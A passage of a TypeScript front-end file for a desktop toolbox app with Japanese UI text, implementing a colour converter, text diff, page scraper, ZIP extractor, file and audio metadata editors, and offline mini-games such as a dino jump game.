      /(-?\d+(?:\.\d+)?)\s*,\s*(-?\d+(?:\.\d+)?)%?\s*,\s*(-?\d+(?:\.\d+)?)%?/,
    );
    if (!m) {
      err("HSL 不正");
      return;
    }
    const [r, g, b] = hslToRgb(+m[1], +m[2], +m[3]);
    apply(r, g, b);
  });
  picker.addEventListener("input", () => {
    if (updating) return;
    const v = picker.value.replace(/^#/, "");
    apply(
      parseInt(v.slice(0, 2), 16),
      parseInt(v.slice(2, 4), 16),
      parseInt(v.slice(4, 6), 16),
    );
  });
  apply(47, 111, 219);
}

// テキスト Diff (行単位 LCS)
function setupDiffTool(): void {
  const left = $id<HTMLTextAreaElement>("diff-left");
  const right = $id<HTMLTextAreaElement>("diff-right");
  const run = $id<HTMLButtonElement>("diff-run");
  const out = $id<HTMLPreElement>("diff-output");
  const status = $id<HTMLSpanElement>("diff-status");
  if (!left || !right || !run || !out) return;
  const escapeHtml = (s: string): string =>
    s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
  const diff = (): void => {
    const a = left.value.split("\n");
    const b = right.value.split("\n");
    const n = a.length;
    const m = b.length;
    // LCS DP (O(n*m) メモリ: 1500*1500 上限を目安に)
    const limit = 1500;
    if (n > limit || m > limit) {
      if (status) status.textContent = `行数が多すぎます (上限 ${limit})`;
      return;
    }
    const dp: Uint16Array = new Uint16Array((n + 1) * (m + 1));
    const w = m + 1;
    for (let i = n - 1; i >= 0; i--) {
      for (let j = m - 1; j >= 0; j--) {
        if (a[i] === b[j]) dp[i * w + j] = dp[(i + 1) * w + (j + 1)] + 1;
        else dp[i * w + j] = Math.max(dp[(i + 1) * w + j], dp[i * w + (j + 1)]);
      }
    }
    let i = 0;
    let j = 0;
    let html = "";
    let added = 0;
    let removed = 0;
    while (i < n && j < m) {
      if (a[i] === b[j]) {
        html += `  ${escapeHtml(a[i])}\n`;
        i++;
        j++;
      } else if (dp[(i + 1) * w + j] >= dp[i * w + (j + 1)]) {
        html += `<span class="diff-del">- ${escapeHtml(a[i])}</span>\n`;
        i++;
        removed++;
      } else {
        html += `<span class="diff-add">+ ${escapeHtml(b[j])}</span>\n`;
        j++;
        added++;
      }
    }
    while (i < n) {
      html += `<span class="diff-del">- ${escapeHtml(a[i++])}</span>\n`;
      removed++;
    }
    while (j < m) {
      html += `<span class="diff-add">+ ${escapeHtml(b[j++])}</span>\n`;
      added++;
    }
    out.innerHTML = html;
    if (status) status.textContent = `+${added} / -${removed}`;
  };
  run.addEventListener("click", diff);
}

// User-Agent / ブラウザ情報
function setupUserAgentTool(): void {
  const ua = $id<HTMLPreElement>("ua-string");
  const lang = $id<HTMLPreElement>("ua-lang");
  const plat = $id<HTMLPreElement>("ua-platform");
  const scr = $id<HTMLPreElement>("ua-screen");
  const tz = $id<HTMLPreElement>("ua-tz");
  const online = $id<HTMLPreElement>("ua-online");
  if (ua) ua.textContent = navigator.userAgent;
  if (lang)
    lang.textContent = `${navigator.language} (${(navigator.languages || []).join(", ")})`;
  if (plat) plat.textContent = navigator.platform;
  if (scr)
    scr.textContent = `${screen.width}x${screen.height} @ DPR ${window.devicePixelRatio}`;
  if (tz) tz.textContent = Intl.DateTimeFormat().resolvedOptions().timeZone;
  if (online) online.textContent = navigator.onLine ? "online" : "offline";
}

// ===== スクレイピング =====
interface ScrapeResult {
  status: number;
  content_type: string;
  body: string;
  bytes: number;
  /** レスポンスヘッダ (key は小文字化)。Rust 側で常時返却。古い呼び出し元は無視で OK。 */
  headers?: [string, string][];
  /** Set-Cookie の name 部分のみ。 */
  cookies?: string[];
}

let scrapeLastBody = "";

function setupScrapeTool(): void {
  const url = $id<HTMLInputElement>("scrape-url");
  const ua = $id<HTMLInputElement>("scrape-ua");
  const fillCur = $id<HTMLButtonElement>("scrape-fill-current");
  const fetchBtn = $id<HTMLButtonElement>("scrape-fetch");
  const status = $id<HTMLSpanElement>("scrape-status");
  const sel = $id<HTMLInputElement>("scrape-selector");
  const extract = $id<HTMLSelectElement>("scrape-extract");
  const apply = $id<HTMLButtonElement>("scrape-apply");
  const out = $id<HTMLPreElement>("scrape-output");
  const raw = $id<HTMLTextAreaElement>("scrape-raw");
  if (!url || !fetchBtn || !out || !raw) return;

  fillCur?.addEventListener("click", () => {
    const a = activeTab();
    if (a) url.value = a.url;
  });

  fetchBtn.addEventListener("click", async () => {
    if (!url.value.trim()) {
      if (status) status.textContent = "URL を入力してください";
      return;
    }
    fetchBtn.disabled = true;
    if (status) status.textContent = "取得中…";
    try {
      const r = await invoke<ScrapeResult>("toolbox_scrape_fetch", {
        url: url.value.trim(),
        userAgent: ua?.value.trim() || null,
      });
      scrapeLastBody = r.body;
      raw.value = r.body;
      out.textContent = "";
      if (status)
        status.textContent = `HTTP ${r.status} / ${r.content_type} / ${r.bytes} bytes`;
    } catch (e) {
      if (status) status.textContent = `エラー: ${String(e)}`;
    } finally {
      fetchBtn.disabled = false;
    }
  });

  apply?.addEventListener("click", () => {
    if (!scrapeLastBody) {
      if (status) status.textContent = "先に取得してください";
      return;
    }
    const q = sel?.value.trim() || "";
    if (!q) {
      out.textContent = scrapeLastBody.slice(0, 100000);
      return;
    }
    try {
      const doc = new DOMParser().parseFromString(scrapeLastBody, "text/html");
      const nodes = doc.querySelectorAll(q);
      const mode = extract?.value || "text";
      const lines: string[] = [];
      nodes.forEach((n, i) => {
        const el = n as Element;
        let v = "";
        switch (mode) {
          case "html":
            v = el.innerHTML;
            break;
          case "outer":
            v = el.outerHTML;
            break;
          case "href":
            v = el.getAttribute("href") || "";
            break;
          case "src":
            v = el.getAttribute("src") || "";
            break;
          default:
            v = el.textContent?.trim() || "";
        }
        lines.push(`[${i}] ${v}`);
      });
      out.textContent = lines.length === 0 ? "(マッチなし)" : lines.join("\n");
      if (status) status.textContent = `${nodes.length} 件マッチ`;
    } catch (e) {
      if (status) status.textContent = `セレクタエラー: ${String(e)}`;
    }
  });
}

// ===== ZIP 解凍 =====
interface ExtractResult {
  files: number;
  bytes: number;
  dest: string;
}

function setupUnzipTool(): void {
  const src = $id<HTMLInputElement>("unzip-src");
  const dest = $id<HTMLInputElement>("unzip-dest");
  const pickSrc = $id<HTMLButtonElement>("unzip-pick-src");
  const pickDest = $id<HTMLButtonElement>("unzip-pick-dest");
  const run = $id<HTMLButtonElement>("unzip-run");
  const open = $id<HTMLButtonElement>("unzip-open");
  const status = $id<HTMLSpanElement>("unzip-status");
  const progressRow = document.getElementById(
    "unzip-progress-row",
  ) as HTMLDivElement | null;
  const progressBar = document.getElementById(
    "unzip-progress-bar",
  ) as HTMLDivElement | null;
  const progressLabel = document.getElementById(
    "unzip-progress-label",
  ) as HTMLSpanElement | null;
  const currentRow = document.getElementById(
    "unzip-current-row",
  ) as HTMLDivElement | null;
  const currentFile = document.getElementById(
    "unzip-current-file",
  ) as HTMLElement | null;
  if (!src || !dest || !run) return;

  pickSrc?.addEventListener("click", async () => {
    try {
      const chosen = await invoke<string | null>("toolbox_pick_archive", {
        initial: src.value || null,
      });
      if (chosen) src.value = chosen;
    } catch (e) {
      if (status) status.textContent = `エラー: ${String(e)}`;
    }
  });

  pickDest?.addEventListener("click", async () => {
    try {
      const chosen = await invoke<string | null>("toolbox_pick_download_dir", {
        initial: dest.value || null,
      });
      if (chosen) dest.value = chosen;
    } catch (e) {
      if (status) status.textContent = `エラー: ${String(e)}`;
    }
  });

  function showProgress(show: boolean): void {
    if (progressRow) progressRow.style.display = show ? "flex" : "none";
    if (currentRow) currentRow.style.display = show ? "flex" : "none";
    if (!show && progressBar) progressBar.style.width = "0%";
    if (!show && progressLabel) progressLabel.textContent = "";
    if (!show && currentFile) currentFile.textContent = "";
  }

  function updateProgress(p: {
    files: number;
    bytes: number;
    total_files?: number | null;
    total_bytes?: number | null;
    current_file?: string | null;
  }): void {
    let pct = 0;
    let label = `${p.files} ファイル / ${(p.bytes / 1024).toFixed(0)} KB`;
    if (p.total_files && p.total_files > 0) {
      pct = Math.min(100, (p.files / p.total_files) * 100);
      label = `${p.files} / ${p.total_files} ファイル (${pct.toFixed(0)}%)`;
    } else if (p.total_bytes && p.total_bytes > 0) {
      pct = Math.min(100, (p.bytes / p.total_bytes) * 100);
      label = `${(p.bytes / 1024).toFixed(0)} / ${(p.total_bytes / 1024).toFixed(0)} KB (${pct.toFixed(0)}%)`;
    } else {
      // 不定: バーをアニメーション (0->100% を周期表示)
      pct = (Date.now() / 30) % 100;
    }
    if (progressBar) progressBar.style.width = `${pct}%`;
    if (progressLabel) progressLabel.textContent = label;
    if (currentFile && p.current_file) currentFile.textContent = p.current_file;
  }

  // Rust 側 (toolbox_extract_archive) が emit する進捗イベント。
  // ペイロード: { files, bytes, total_files?, total_bytes?, current_file? }
  void listen<{
    files: number;
    bytes: number;
    total_files?: number | null;
    total_bytes?: number | null;
    current_file?: string | null;
  }>("toolbox-extract-progress", (ev) => {
    if (!progressRow || progressRow.style.display === "none") return;
    updateProgress(ev.payload);
  });

  run.addEventListener("click", async () => {
    if (!src.value.trim() || !dest.value.trim()) {
      if (status) status.textContent = "アーカイブと出力先を指定してください";
      return;
    }
    run.disabled = true;
    if (status) status.textContent = "解凍中…";
    showProgress(true);
    updateProgress({ files: 0, bytes: 0 });
    try {
      const r = await invoke<ExtractResult>("toolbox_extract_archive", {
        archivePath: src.value.trim(),
        destDir: dest.value.trim(),
      });
      if (status)
        status.textContent = `完了: ${r.files} ファイル / ${r.bytes.toLocaleString()} bytes → ${r.dest}`;
      // 完了状態を表示。バーは 100% にしてから少し残す。
      if (progressBar) progressBar.style.width = "100%";
      if (progressLabel)
        progressLabel.textContent = `完了 (${r.files} ファイル, ${(r.bytes / 1024).toFixed(0)} KB)`;
      window.setTimeout(() => showProgress(false), 1500);
    } catch (e) {
      if (status) status.textContent = `エラー: ${String(e)}`;
      showProgress(false);
    } finally {
      run.disabled = false;
    }
  });

  open?.addEventListener("click", async () => {
    if (!dest.value.trim()) return;
    try {
      await invoke("toolbox_open_path", { path: dest.value.trim() });
    } catch (e) {
      if (status) status.textContent = `エラー: ${String(e)}`;
    }
  });
}

// ===== ファイルメタデータ =====
interface FileMetaInfo {
  path: string;
  size: number;
  mtime: number | null;
  atime: number | null;
  ctime: number | null;
  image_info: { label: string; value: string }[];
}

function unixToLocalInput(unix: number | null): string {
  if (unix == null) return "";
  const d = new Date(unix * 1000);
  const pad = (n: number): string => String(n).padStart(2, "0");
  return `${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())}T${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
}

function localInputToUnix(v: string): number | null {
  if (!v) return null;
  const d = new Date(v);
  if (Number.isNaN(d.getTime())) return null;
  return Math.floor(d.getTime() / 1000);
}

function setupFileMetaTool(): void {
  const path = $id<HTMLInputElement>("fm-path");
  const pick = $id<HTMLButtonElement>("fm-pick");
  const sizeEl = $id<HTMLPreElement>("fm-size");
  const mtimeEl = $id<HTMLInputElement>("fm-mtime");
  const atimeEl = $id<HTMLInputElement>("fm-atime");
  const setBtn = $id<HTMLButtonElement>("fm-set-times");
  const stripBtn = $id<HTMLButtonElement>("fm-strip");
  const status = $id<HTMLSpanElement>("fm-status");
  const imgEl = $id<HTMLPreElement>("fm-image");
  if (!path || !sizeEl || !mtimeEl || !atimeEl || !imgEl) return;

  const load = async (): Promise<void> => {
    if (!path.value.trim()) return;
    try {
      const r = await invoke<FileMetaInfo>("toolbox_get_file_meta", {
        path: path.value.trim(),
      });
      const ctime =
        r.ctime != null ? new Date(r.ctime * 1000).toLocaleString() : "(不明)";
      sizeEl.textContent = `${r.size.toLocaleString()} bytes  /  作成: ${ctime}`;
      mtimeEl.value = unixToLocalInput(r.mtime);
      atimeEl.value = unixToLocalInput(r.atime);
      imgEl.textContent =
        r.image_info.length === 0
          ? "(画像メタなし、または対象外)"
          : r.image_info.map((e) => `${e.label}\t${e.value}`).join("\n");
      if (status) status.textContent = "読み込みました";
    } catch (e) {
      if (status) status.textContent = `エラー: ${String(e)}`;
    }
  };

  pick?.addEventListener("click", async () => {
    try {
      const chosen = await invoke<string | null>("toolbox_pick_file", {
        initial: path.value || null,
      });
      if (chosen) {
        path.value = chosen;
        await load();
      }
    } catch (e) {
      if (status) status.textContent = `エラー: ${String(e)}`;
    }
  });
  // パス変更で自動読込 (貼り付け/手入力も含む)
  let pathDebounce: number | null = null;
  const scheduleLoad = (): void => {
    if (pathDebounce != null) window.clearTimeout(pathDebounce);
    pathDebounce = window.setTimeout(() => {
      pathDebounce = null;
      void load();
    }, 250);
  };
  path.addEventListener("input", scheduleLoad);
  path.addEventListener("change", () => void load());
  path.addEventListener("blur", () => void load());

  setBtn?.addEventListener("click", async () => {
    if (!path.value.trim()) return;
    try {
      await invoke("toolbox_set_file_times", {
        path: path.value.trim(),
        mtime: localInputToUnix(mtimeEl.value),
        atime: localInputToUnix(atimeEl.value),
      });
      if (status) status.textContent = "時刻を更新しました";
      await load();
    } catch (e) {
      if (status) status.textContent = `エラー: ${String(e)}`;
    }
  });

  stripBtn?.addEventListener("click", async () => {
    if (!path.value.trim()) return;
    const p = path.value.trim();
    const dot = p.lastIndexOf(".");
    const dest =
      dot > 0 ? `${p.slice(0, dot)}_clean${p.slice(dot)}` : `${p}_clean`;
    try {
      const out = await invoke<string>("toolbox_strip_image_meta", {
        path: p,
        dest,
      });
      if (status) status.textContent = `保存: ${out}`;
    } catch (e) {
      if (status) status.textContent = `エラー: ${String(e)}`;
    }
  });
}

// ===== 音声タグ (lofty バックエンド経由) =====
interface AudioTagData {
  format?: string;
  tagType?: string;
  title?: string | null;
  artist?: string | null;
  album?: string | null;
  albumArtist?: string | null;
  year?: number | null;
  genre?: string | null;
  composer?: string | null;
  publisher?: string | null;
  track?: number | null;
  totalTracks?: number | null;
  disc?: number | null;
  totalDiscs?: number | null;
  bpm?: string | null;
  key?: string | null;
  lang?: string | null;
  isrc?: string | null;
  encodedBy?: string | null;
  encoderSettings?: string | null;
  copyright?: string | null;
  grouping?: string | null;
  subtitle?: string | null;
  conductor?: string | null;
  remixer?: string | null;
  origArtist?: string | null;
  origAlbum?: string | null;
  url?: string | null;
  comment?: string | null;
  lyrics?: string | null;
  hasPicture?: boolean;
  pictureMime?: string | null;
  pictureSize?: number | null;
  durationSecs?: number | null;
  bitrate?: number | null;
  sampleRate?: number | null;
  channels?: number | null;
}

const AUDIO_EXTS = new Set([
  "mp3",
  "wav",
  "wave",
  "flac",
  "ogg",
  "oga",
  "opus",
  "spx",
  "m4a",
  "m4b",
  "m4p",
  "mp4",
  "aac",
  "aiff",
  "aif",
  "aifc",
  "ape",
  "wv",
  "mpc",
]);

function setupAudioTagsTool(): void {
  const pathEl = $id<HTMLInputElement>("fm-path");
  const status = $id<HTMLSpanElement>("fm-status");
  const saveBtn = $id<HTMLButtonElement>("id3-save");
  const clearBtn = $id<HTMLButtonElement>("id3-clear-all");
  const artChange = $id<HTMLButtonElement>("id3-art-change");
  const artRemove = $id<HTMLButtonElement>("id3-art-remove");
  const artTagmp3 = $id<HTMLButtonElement>("id3-art-tagmp3");
  const artInfo = $id<HTMLPreElement>("id3-art-info");
  const artPreview = $id<HTMLImageElement>("id3-art-preview");
  if (!pathEl || !saveBtn) return;

  const fields: Record<string, string> = {
    title: "id3-title",
    artist: "id3-artist",
    album: "id3-album",
    albumArtist: "id3-album-artist",
    year: "id3-year",
    genre: "id3-genre",
    composer: "id3-composer",
    publisher: "id3-publisher",
    track: "id3-track",
    totalTracks: "id3-total-tracks",
    disc: "id3-disc",
    totalDiscs: "id3-total-discs",
    bpm: "id3-bpm",
    key: "id3-key",
    lang: "id3-lang",
    isrc: "id3-isrc",
    encodedBy: "id3-encoded-by",
    encoderSettings: "id3-encoder-settings",
    copyright: "id3-copyright",
    grouping: "id3-grouping",
    subtitle: "id3-subtitle",
    conductor: "id3-conductor",
    remixer: "id3-remixer",
    origArtist: "id3-orig-artist",
    origAlbum: "id3-orig-album",
    url: "id3-url",
    comment: "id3-comment",
    lyrics: "id3-lyrics",
  };
  const numericFields = new Set([
    "year",
    "track",
    "totalTracks",
    "disc",
    "totalDiscs",
  ]);

  const isAudio = (p: string): boolean => {
    const dot = p.lastIndexOf(".");
    if (dot < 0) return false;
    return AUDIO_EXTS.has(p.slice(dot + 1).toLowerCase());
  };

  const clearForm = (): void => {
    Object.values(fields).forEach((id) => {
      const el = $id<HTMLInputElement | HTMLTextAreaElement>(id);
      if (el) el.value = "";
    });
    if (artInfo) artInfo.textContent = "(なし)";
    if (artPreview) {
      artPreview.removeAttribute("src");
      artPreview.style.display = "none";
    }
  };

  const fillForm = (d: AudioTagData): void => {
    for (const [k, id] of Object.entries(fields)) {
      const el = $id<HTMLInputElement | HTMLTextAreaElement>(id);
      if (!el) continue;
      const v = (d as Record<string, unknown>)[k];
      if (v == null) {
        el.value = "";
      } else {
        el.value = String(v);
      }
    }
    if (artInfo) {
      if (d.hasPicture) {
        const sz = d.pictureSize ?? 0;
        const mime = d.pictureMime ?? "?";
        artInfo.textContent = `${mime}\n${sz.toLocaleString()} bytes`;
      } else {
        artInfo.textContent = "(なし)";
      }
    }
    const fmt = d.format ?? "?";
    const tt = d.tagType ?? "?";
    const dur =
      d.durationSecs != null
        ? `${Math.floor(d.durationSecs / 60)}:${String(d.durationSecs % 60).padStart(2, "0")}`
        : "?";
    const br = d.bitrate != null ? `${d.bitrate} kbps` : "";
    const sr = d.sampleRate != null ? `${d.sampleRate} Hz` : "";
    const ch = d.channels != null ? `${d.channels}ch` : "";
    if (status)
      status.textContent =
        `音声 [${fmt}/${tt}] ${dur} ${br} ${sr} ${ch}`.replace(/\s+/g, " ");
  };

  const collectForm = (): AudioTagData => {
    const out: AudioTagData = {};
    for (const [k, id] of Object.entries(fields)) {
      const el = $id<HTMLInputElement | HTMLTextAreaElement>(id);
      if (!el) continue;
      const v = el.value;
      if (numericFields.has(k)) {
        if (v.trim() === "") {
          (out as Record<string, unknown>)[k] = null;
        } else {
          const n = parseInt(v, 10);
          (out as Record<string, unknown>)[k] = Number.isFinite(n) ? n : null;
        }
      } else {
        (out as Record<string, unknown>)[k] = v;
      }
    }
    return out;
  };

  const loadPicture = async (p: string, hasPic: boolean): Promise<void> => {
    if (!artPreview) return;
    if (!hasPic) {
      artPreview.removeAttribute("src");
      artPreview.style.display = "none";
      return;
    }
    try {
      const pic = await invoke<{
        dataUrl: string;
        mime: string;
        size: number;
      } | null>("toolbox_get_audio_picture", { path: p });
      if (pic && pic.dataUrl) {
        artPreview.src = pic.dataUrl;
        artPreview.style.display = "";
      } else {
        artPreview.removeAttribute("src");
        artPreview.style.display = "none";
      }
    } catch {
      artPreview.removeAttribute("src");
      artPreview.style.display = "none";
    }
  };

  const load = async (): Promise<void> => {
    const p = pathEl.value.trim();
    if (!p) return;
    if (!isAudio(p)) {
      clearForm();
      return;
    }
    try {
      const d = await invoke<AudioTagData>("toolbox_get_audio_tags", {
        path: p,
      });
      fillForm(d);
      await loadPicture(p, !!d.hasPicture);
    } catch (e) {
      clearForm();
      if (status) status.textContent = `音声タグ読込失敗: ${String(e)}`;
    }
  };

  // fm-path が変わったら自動読込 (input/change/blur)
  let audioDebounce: number | null = null;
  pathEl.addEventListener("input", () => {
    if (audioDebounce != null) window.clearTimeout(audioDebounce);
    audioDebounce = window.setTimeout(() => {
      audioDebounce = null;
      void load();
    }, 250);
  });
  pathEl.addEventListener("change", () => void load());
  pathEl.addEventListener("blur", () => void load());
  // ピック後にも反応するよう、参照ボタンにもフック
  $id<HTMLButtonElement>("fm-pick")?.addEventListener("click", () => {
    setTimeout(() => void load(), 100);
  });

  saveBtn.addEventListener("click", async () => {
    const p = pathEl.value.trim();
    if (!p) {
      if (status) status.textContent = "ファイルを指定してください";
      return;
    }
    if (!isAudio(p)) {
      if (status) status.textContent = "音声ファイルではありません";
      return;
    }
    try {
      const data = collectForm();
      await invoke("toolbox_save_audio_tags", { path: p, data });
      if (status) status.textContent = "音声タグを書き込みました";
      await load();
    } catch (e) {
      if (status) status.textContent = `書込失敗: ${String(e)}`;
    }
  });

  clearBtn?.addEventListener("click", async () => {
    const p = pathEl.value.trim();
    if (!p) return;
    if (!isAudio(p)) {
      if (status) status.textContent = "音声ファイルではありません";
      return;
    }
    if (!confirm("このファイルからすべてのタグを削除しますか?")) return;
    try {
      await invoke("toolbox_clear_audio_tags", { path: p });
      if (status) status.textContent = "すべてのタグを削除しました";
      clearForm();
      await load();
    } catch (e) {
      if (status) status.textContent = `削除失敗: ${String(e)}`;
    }
  });

  // tagmp3.net をブラウザの新規タブで開く。アルバムアート埋め込みは
  // Windows Explorer のサムネイルキャッシュ周りで挙動が安定しないため、
  // 専用 Web サービスに誘導する。
  artTagmp3?.addEventListener("click", () => {
    try {
      window.open("https://tagmp3.net/", "_blank", "noopener,noreferrer");
    } catch {
      /* noop */
    }
  });

  // 旧ボタン (画像選択 / 削除) は HTML から消えているが、参照だけ残しておく
  void artChange;
  void artRemove;
}

interface GenericField {
  key: string;
  value: string;
  editable: boolean;
}
interface GenericMeta {
  kind: string;
  editable: boolean;
  fields: GenericField[];
  info: string;
}

function setupGenericMetaTool(): void {
  const pathEl = $id<HTMLInputElement>("fm-path");
  const kindEl = $id<HTMLSpanElement>("generic-kind");
  const fieldsEl = $id<HTMLDivElement>("generic-fields");
  const addBtn = $id<HTMLButtonElement>("generic-add");
  const saveBtn = $id<HTMLButtonElement>("generic-save");
  const status = $id<HTMLSpanElement>("generic-status");
  const infoEl = $id<HTMLPreElement>("generic-info");
  const pick = $id<HTMLButtonElement>("fm-pick");
  if (!pathEl || !fieldsEl) return;
  let currentEditable = false;

  const renderRow = (f: GenericField, editable: boolean): HTMLDivElement => {
    const row = document.createElement("div");
    row.className = "generic-row";
    row.style.display = "flex";
    row.style.gap = "4px";
    row.style.marginBottom = "4px";
    const k = document.createElement("input");
    k.type = "text";
    k.value = f.key;
    k.placeholder = "key";
    k.dataset.role = "key";
    k.style.flex = "0 0 30%";
    if (!editable) k.disabled = true;
    const v = document.createElement("input");
    v.type = "text";
    v.value = f.value;
    v.placeholder = "value";
    v.dataset.role = "value";
    v.style.flex = "1";
    if (!editable) v.disabled = true;
    const del = document.createElement("button");
    del.type = "button";
    del.textContent = "✕";
    del.title = "この項目を削除";
    if (!editable) del.disabled = true;
    del.addEventListener("click", () => row.remove());
    row.append(k, v, del);
    return row;
  };

  const load = async (): Promise<void> => {
    const p = pathEl.value.trim();
    fieldsEl.innerHTML = "";
    if (kindEl) kindEl.textContent = "";
    if (infoEl) infoEl.textContent = "";
    if (status) status.textContent = "";
    if (!p) return;
    try {
      const meta = await invoke<GenericMeta>("toolbox_get_generic_meta", {
        path: p,
      });
      currentEditable = meta.editable;
      if (kindEl)
        kindEl.textContent = `形式: ${meta.kind}${meta.editable ? "" : " (読取専用)"}`;
      if (infoEl) infoEl.textContent = meta.info ?? "";
      for (const f of meta.fields)
        fieldsEl.appendChild(renderRow(f, meta.editable));
      if (addBtn) addBtn.disabled = !meta.editable;
      if (saveBtn) saveBtn.disabled = !meta.editable;
    } catch (e) {
      if (status) status.textContent = `読込失敗: ${String(e)}`;
      if (addBtn) addBtn.disabled = true;
      if (saveBtn) saveBtn.disabled = true;
    }
  };

  pathEl.addEventListener("change", () => {
    void load();
  });
  pathEl.addEventListener("blur", () => {
    void load();
  });
  pick?.addEventListener("click", () => {
    setTimeout(() => {
      void load();
    }, 100);
  });

  addBtn?.addEventListener("click", () => {
    if (!currentEditable) return;
    fieldsEl.appendChild(
      renderRow({ key: "", value: "", editable: true }, true),
    );
  });

  saveBtn?.addEventListener("click", async () => {
    const p = pathEl.value.trim();
    if (!p || !currentEditable) return;
    const fields: GenericField[] = [];
    for (const row of Array.from(fieldsEl.children)) {
      const k =
        (
          row.querySelector('[data-role="key"]') as HTMLInputElement | null
        )?.value.trim() ?? "";
      const v =
        (row.querySelector('[data-role="value"]') as HTMLInputElement | null)
          ?.value ?? "";
      if (!k) continue;
      fields.push({ key: k, value: v, editable: true });
    }
    try {
      await invoke("toolbox_save_generic_meta", { path: p, fields });
      if (status) status.textContent = "保存しました";
      await load();
    } catch (e) {
      if (status) status.textContent = `保存失敗: ${String(e)}`;
    }
  });
}

// ===== ミニゲーム (オフライン暇つぶし) =====

type MiniGameKind = "dino" | "snake" | "2048" | "memory" | "rhythm" | "suika";

let miniGameCleanup: (() => void) | null = null;
let miniGameCurrent: MiniGameKind = "dino";
const miniGameBest: Record<MiniGameKind, number> = {
  dino: 0,
  snake: 0,
  "2048": 0,
  memory: 0,
  rhythm: 0,
  suika: 0,
};

function setupMiniGameTool(): void {
  const canvas = $id<HTMLCanvasElement>("minigame-canvas");
  const grid = $id<HTMLDivElement>("minigame-grid");
  const scoreEl = $id<HTMLSpanElement>("minigame-score");
  const bestEl = $id<HTMLSpanElement>("minigame-best");
  const helpEl = $id<HTMLParagraphElement>("minigame-help");
  const restart = $id<HTMLButtonElement>("minigame-restart");
  const netEl = $id<HTMLSpanElement>("minigame-net");
  if (!canvas || !grid || !scoreEl || !bestEl || !helpEl) return;

  // ベストスコアを localStorage から復元
  try {
    const raw = localStorage.getItem("yuzu-minigame-best");
    if (raw) {
      const obj = JSON.parse(raw) as Partial<Record<MiniGameKind, number>>;
      for (const k of Object.keys(obj) as MiniGameKind[]) {
        if (typeof obj[k] === "number") miniGameBest[k] = obj[k]!;
      }
    }
  } catch {
    // noop
  }

  const updateNet = (): void => {
    if (netEl) {
      netEl.textContent = navigator.onLine ? "オンライン" : "オフライン";
      netEl.style.color = navigator.onLine ? "#3a3" : "#c33";
    }
  };
  updateNet();
  window.addEventListener("online", updateNet);
  window.addEventListener("offline", updateNet);

  const setScore = (s: number): void => {
    scoreEl.textContent = `スコア: ${s}`;
    if (s > miniGameBest[miniGameCurrent]) {
      miniGameBest[miniGameCurrent] = s;
      bestEl.textContent = `ベスト: ${s}`;
      try {
        localStorage.setItem(
          "yuzu-minigame-best",
          JSON.stringify(miniGameBest),
        );
      } catch {
        // noop
      }
    }
  };
  const showBest = (): void => {
    bestEl.textContent = `ベスト: ${miniGameBest[miniGameCurrent]}`;
  };

  const switchTo = (kind: MiniGameKind): void => {
    if (miniGameCleanup) {
      miniGameCleanup();
      miniGameCleanup = null;
    }
    miniGameCurrent = kind;
    setScore(0);
    showBest();
    // ボタン active 状態
    document.querySelectorAll<HTMLButtonElement>("[data-game]").forEach((b) => {
      b.classList.toggle("active", b.dataset.game === kind);
    });
    if (kind === "memory") {
      canvas.style.display = "none";
      grid.style.display = "grid";
    } else {
      canvas.style.display = "block";
      grid.style.display = "none";
    }
    if (kind === "dino") {
      helpEl.textContent =
        "操作: スペース / ↑ でジャンプ。サボテンを避けよう。";
      miniGameCleanup = startDinoGame(canvas, setScore);
    } else if (kind === "snake") {
      helpEl.textContent = "操作: 矢印キーで移動。エサを食べて伸ばそう。";
      miniGameCleanup = startSnakeGame(canvas, setScore);
    } else if (kind === "2048") {
      helpEl.textContent = "操作: 矢印キーでスライド。同じ数字を合わせる。";
      miniGameCleanup = start2048Game(canvas, setScore);
    } else if (kind === "memory") {
      helpEl.textContent = "操作: クリックでカードをめくる。全ペアを当てよう。";
      miniGameCleanup = startMemoryGame(grid, setScore);
    } else if (kind === "rhythm") {
      helpEl.textContent =
        "操作: D / F / J / K (または画面クリック) で判定ライン上のノーツを叩く。";
      miniGameCleanup = startRhythmGame(canvas, setScore);
    } else {
      helpEl.textContent =
        "操作: マウスを動かしてクリックで果物を落とす。同じ果物をくっつけると進化！";
      miniGameCleanup = startSuikaGame(canvas, setScore);
    }
    canvas.focus();
  };

  document.querySelectorAll<HTMLButtonElement>("[data-game]").forEach((b) => {
    b.addEventListener("click", () => {
      const k = (b.dataset.game ?? "dino") as MiniGameKind;
      switchTo(k);
    });
  });
  restart?.addEventListener("click", () => switchTo(miniGameCurrent));

  // 初期ゲーム
  switchTo("dino");
}

// ---- 共通ヘルパ ----
function attachKeyHandler(
  target: HTMLElement,
  handler: (e: KeyboardEvent) => void,
): () => void {
  const wrapper = (e: KeyboardEvent): void => {
    if (
      ["ArrowUp", "ArrowDown", "ArrowLeft", "ArrowRight", " "].includes(e.key)
    ) {
      e.preventDefault();
    }
    handler(e);
  };
  target.addEventListener("keydown", wrapper);
  return () => target.removeEventListener("keydown", wrapper);
}

// ---- 🦖 ジャンプゲーム ----
function startDinoGame(
  canvas: HTMLCanvasElement,
  setScore: (n: number) => void,
): () => void {
  const ctx = canvas.getContext("2d")!;
  const W = canvas.width;
  const H = canvas.height;
  const groundY = H - 40;
  let x = 60;
  let y = groundY;
  let vy = 0;
  // 重力を弱め、ジャンプを高くして滑空を長くし、タイミングを取りやすくする。
  const gravity = 0.22;
  const jumpVy = -10;
  let speed = 1.6;
  let score = 0;
  let alive = true;
  interface Obs {
    x: number;
    w: number;
    h: number;
  }
  const obs: Obs[] = [];
  let frame = 0;

  const reset = (): void => {
    obs.length = 0;
    obs.push({ x: W + 100, w: 18, h: 30 });
  };
  reset();

  const removeKey = attachKeyHandler(canvas, (e) => {
    if ((e.key === " " || e.key === "ArrowUp") && y >= groundY && alive) {
      vy = jumpVy;
    }
  });
  const onClick = (): void => {
    if (y >= groundY && alive) vy = jumpVy;
    if (!alive) {
      alive = true;
      score = 0;
      speed = 1.6;
      reset();
      setScore(0);
    }
  };
  canvas.addEventListener("click", onClick);

  let raf = 0;
  const loop = (): void => {
    frame++;
    ctx.fillStyle = "#f7f7f7";
    ctx.fillRect(0, 0, W, H);
    // 地面
    ctx.strokeStyle = "#555";
    ctx.beginPath();
    ctx.moveTo(0, groundY + 5);
    ctx.lineTo(W, groundY + 5);
    ctx.stroke();

    if (alive) {
      vy += gravity;
      y += vy;
